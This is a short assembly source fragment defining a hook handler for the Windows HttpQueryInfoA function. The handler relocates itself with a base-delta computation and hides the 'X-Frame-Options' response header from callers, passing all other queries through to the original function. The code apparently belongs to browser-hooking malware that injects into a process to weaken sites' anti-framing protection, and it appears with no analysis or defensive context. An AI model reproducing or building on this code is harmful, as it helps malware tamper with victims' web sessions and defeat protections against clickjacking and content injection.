
.code

;; ==================================================================================================== ;;
;; hHttpQueryInfoA is a HttpQueryInfoA handler procedure                                                ;;
;; ==================================================================================================== ;;
hHttpQueryInfoA proc uses ebx p1, p2, p3, p4, p5 : dword

	GetBaseDelta ebx



	cmp  p2, 0FFFFh
	jne  @real
	invokx  &StrIPos[ebx], p3, 15, "X-Frame-Options", 15
	jmpz eax, @real
	xor  eax, eax
	jmp  @ret


@real:
	invokx  _HttpQueryInfoA[ebx], p1, p2, p3, p4, p5
@ret:
	ret
hHttpQueryInfoA endp

